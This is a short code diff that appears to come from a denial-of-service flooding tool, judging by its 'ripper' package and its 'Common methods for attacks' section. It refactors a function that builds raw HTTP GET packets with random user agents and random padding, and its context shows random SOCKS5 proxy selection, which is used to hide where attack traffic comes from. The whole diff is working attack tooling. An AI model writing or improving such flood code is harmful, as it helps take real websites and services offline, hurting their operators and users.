@@ -1,7 +1,7 @@
 import re
-import sys
 import socket
 import socks
+import time
 import random
 import urllib.request
 import threading
@@ -17,12 +17,14 @@ from ripper.proxy import Sock5Proxy
 # Common methods for attacks
 ###############################################
 def build_request_http_package(_ctx) -> str:
-    extra_data = get_random_string(1, _ctx.max_random_packet_len) if _ctx.random_packet_len else ''
-    return f'GET / HTTP/1.1' \
+    packet_txt = f'GET / HTTP/1.1' \
                  f'\nHost: {_ctx.host}' \
                  f'\n\n User-Agent: {random.choice(_ctx.user_agents)}' \
-                 f'\n{_ctx.base_headers[0]}' \
-                 f'\n\n{extra_data}'.encode('utf-8')
+                 f'\n{_ctx.base_headers[0]}'
+    if _ctx.max_random_packet_len > 0:
+        extra_data = get_random_string(1, _ctx.max_random_packet_len)
+        packet_txt += f'\n\n{extra_data}'
+    return packet_txt.encode('utf-8')
 
 
 def random_proxy_from_context(_ctx) -> Sock5Proxy:
